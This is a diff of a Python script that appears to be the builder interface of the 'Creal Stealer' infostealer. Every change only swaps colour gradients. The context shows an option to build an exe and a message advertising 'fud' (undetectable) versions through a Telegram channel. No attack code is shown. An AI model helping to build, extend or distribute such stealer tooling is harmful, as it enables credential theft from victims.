@@ -20,7 +20,7 @@ ___________.__
 
 """
 
-Anime.Fade(Center.Center(intro), Colors.black_to_red, Colorate.Vertical, interval=0.035, enter=True)
+Anime.Fade(Center.Center(intro), Colors.red_to_blue, Colorate.Vertical, interval=0.035, enter=True)
 
 
 print(f"""{Fore.LIGHTRED_EX}
@@ -71,7 +71,7 @@ while True:
             elif answer.upper() == "N":
                 break
             else:
-                Write.Print("\nYou have entered invalid. Please try again.", Colors.red_to_purple)
+                Write.Print("\nYou have entered invalid. Please try again.", Colors.blue_to_purple)
 
         while True:
             answer = input(Fore.CYAN + "\nDo you want to make exe file? (Y/N) " + Style.RESET_ALL)
@@ -86,7 +86,7 @@ while True:
             elif answer.upper() == "N":
                 break
             else:
-                Write.Print("\nYou have entered invalid. Please try again.", Colors.red_to_purple)
+                Write.Print("\nYou have entered invalid. Please try again.", Colors.blue_to_purple)
 
     elif choice == "2":
         Write.Print("\nWe can share the fud for free but not now. if you want fud Telegram: https://t.me/CrealStealer", Colors.red_to_yellow)
@@ -96,4 +96,4 @@ while True:
         break
 
     else:
-        Write.Print("\nYou have entered invalid. Please try again.", Colors.red_to_purple)
+        Write.Print("\nYou have entered invalid. Please try again.", Colors.blue_to_purple)
